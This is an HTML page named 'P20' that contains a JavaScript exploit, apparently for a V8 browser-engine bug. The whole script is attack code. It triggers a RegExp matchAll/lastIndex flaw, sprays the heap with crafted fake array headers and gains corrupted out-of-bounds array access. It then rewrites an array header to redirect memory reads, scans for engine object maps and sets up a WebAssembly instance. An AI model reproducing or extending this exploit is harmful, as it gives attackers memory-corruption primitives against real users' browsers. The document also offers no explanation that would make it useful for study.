<!doctype html><html><head><meta charset="utf-8"><title>P20</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1080011,MAXS=0x7fdffffe;
const dbl=new Array(0x8000);for(let i=0;i<dbl.length;i++)dbl[i]=10.125+i*0.001;
const obj=new Array(0x8000);for(let i=0;i<obj.length;i++)obj[i]=null;
const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
const victim=[1.22,1.33,1.44];
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
const sk=[];
function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
log("UA: "+navigator.userAgent);
trash(230);trash(230);
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
spray();spray();spray();
try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));
if(Array.isArray(m)){
  log("L: "+m.length);
  // Read data at PIN (cage+0x1080018)
  const d=[];
  for(let k=0;k<4;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");}}
  log("D: "+d.join(","));
  
  // Find header: search for PIN|MAXS = 0x7fdffffe01080011
  const target=0x7fdffffe01080011n;
  let hdr=-1;
  for(let k=0x7FF0;k<=0x800F;k++){
    try{if(f2i(m[k])===target){hdr=k;break;}}catch(e){break;}
  }
  
  if(hdr>=0){
    log("HDR@"+hdr.toString(16));
    // Self-modify: redirect elements to PIN-8 (0x1080009)
    // This makes m[0] read from cage+0x1080010 (the FDA header itself)
    m[hdr]=i2f((BigInt(MAXS)<<32n)|0x1080009n);
    // Now m[0] = QWORD at cage+0x1080010 (map|length of the object at PIN)
    const fda_hdr=f2i(m[0]);
    const map32=Number(fda_hdr&0xffffffffn);
    const len32=Number(fda_hdr>>32n);
    log("MAP: "+map32.toString(16)+" LEN: "+len32.toString(16));
    // Read before the object: m[0] at 0x1080009-1+8 = 0x1080010
    // m[1] = cage+0x1080018 (same as original m[0])
    // m[-1] = cage+0x1080008 (8 bytes before object)
    // But we redirected: m[0]=0x1080010, m[1]=0x1080018, m[2]=0x1080020
    // Also read: what's at cage+0x1080008 (before this object)?
    // Can't read m[-1]. But we can redirect to 0x1080001 → m[0] reads cage+0x1080008
    // Too risky (one-way). Instead, read more at current redirect:
    // m[0]=hdr at 0x1080010, m[1]=data[0] at 0x1080018 (should be 0x66e)
    const verify=f2i(m[1]);
    log("V: "+verify.toString(16)); // should match original m[0]=0x66e
    
    // Read the page header: scan backwards from PIN
    // cage+0x1080000: possible page start
    // m[k] at redirect 0x1080009 → cage + 0x1080008 + 8 + k*8
    // For cage+0x1080000: k = (0x1080000 - 0x1080010)/8 = -2 → can't access
    // For cage+0x1080008: k = (0x1080008 - 0x1080010)/8 = -1 → can't access
    
    // Read forward: what objects follow?
    // Scan m[0x7FFE..0x8005] at new redirect for next object header
    const scan=[];
    for(let k=0x3FF0;k<0x4010;k++){
      try{
        const v=f2i(m[k]);
        const lo=Number(v&0xffffffffn);
        // Check for known V8 map values
        if(lo===0x939||lo===0x5dd||lo===0x1032a5d||lo===0x1032ae5||lo===0x515||lo===0x7e5){
          scan.push(k.toString(16)+":"+lo.toString(16)+"|"+Number(v>>32n).toString(16));
        }
      }catch(e){break;}
    }
    log("SCAN: "+scan.join(","));
  }else{
    log("NO_HDR");
    // Still show data
    const d2=[];
    for(let k=0x7FFE;k<=0x8003;k++){
      try{d2.push(f2i(m[k]).toString(16).slice(-8));}catch(e){d2.push("E");break;}
    }
    log("HDR_AREA: "+d2.join(","));
  }
  log("W: "+wasmI.exports.f());
}else{log("NO_ARR");}
}catch(e){log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
